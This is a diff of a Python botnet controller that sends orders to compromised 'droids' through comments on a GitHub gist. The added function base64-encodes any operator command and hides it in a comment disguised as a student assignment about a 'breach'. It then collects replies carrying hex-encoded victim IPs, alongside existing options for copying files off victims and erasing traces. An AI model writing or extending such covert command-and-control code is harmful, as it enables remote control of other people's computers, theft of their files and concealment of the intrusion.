@@ -169,8 +169,32 @@ def request_file(git, number):
         file_name = path.split("/")
         file_name = str(file_name[len(file_name) - 1])
         file_name = str(ip) + "_" + file_name
-        execute_command("echo " + file_content + " > " + file_name)
+        try:
+            execute_command("echo " + file_content + " > " + file_name)
+        except:
+            return
         print("Droid with ip " + str(ip) + " downloaded file to: " + file_name)
+
+
+def request_command_execution(git, number):
+    command = input("What should I order the droids? (to attack?)\n")
+    command_base = base64.b64encode(command.encode("utf-8")).decode("utf-8")
+    comment_text = "# Assignment " + str(number) + \
+                   "\nStudents, there has been a breach to your computer. " \
+                   "Find where from it is coming from. (url)\n\n[//]: <> ( " \
+                   + command_base + " )"
+    git.add_comment_to_gist(comment_text)
+    print("Sending command to droids...")
+    wait_for_reasonable_time()
+    related_comments = []
+    for comment in git.get_gist_comments():
+        if comment['body'].startswith("> # Assignment " + str(number)):
+            related_comments.append(comment['body'])
+
+    for comment in related_comments:
+        lines = comment.splitlines()
+        ip = bytes.fromhex(lines[2].split()[3]).decode("utf-8")
+        print("Droid with ip " + str(ip) + " is executing command.")
 
 
 if __name__ == '__main__':
@@ -193,7 +217,7 @@ if __name__ == '__main__':
               "2 - Get list of directory content on droids\n" \
               "3 - Get droids username\n" \
               "4 - Copy file from droid\n" \
-              "5 - Execute binary on droid\n" \
+              "5 - Execute any command\n" \
               "6 - Quit and remove all traces of communication\n"
     wrong_option_text = "I am so sorry to disagree with your order, my lord. " \
                         "But your answer must be a number from 1 to 6."
@@ -219,7 +243,7 @@ if __name__ == '__main__':
             request_file(git_instance, assignment_number)
         elif selected_option == 5:
             assignment_number += 1
-            request_content_of_directory(git_instance, assignment_number)
+            request_command_execution(git_instance, assignment_number)
         elif selected_option == 6:
             run = False
             git_instance.remove_gist()
